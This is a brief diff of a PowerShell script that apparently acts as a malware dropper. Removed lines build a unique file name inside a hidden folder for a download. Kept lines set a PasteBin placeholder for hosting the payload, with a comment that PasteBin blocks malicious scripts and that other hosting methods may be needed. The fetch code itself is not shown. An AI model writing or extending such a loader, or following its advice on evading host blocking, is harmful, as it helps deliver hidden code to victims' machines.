@@ -27,10 +27,6 @@ try {
     exit
 }
 
-# Generate a unique text file name and download the file
-$uniqueTxtName = [guid]::NewGuid().ToString() + ".txt"
-$outPathTxt = Join-Path -Path $hiddenFolderPath -ChildPath $uniqueTxtName
-
 # PasteBin Link
 $PasteBin = "Your PasteBin" #PasteBin blocks malicious scripts, so you might have to use some other methods to host the powershell script
 
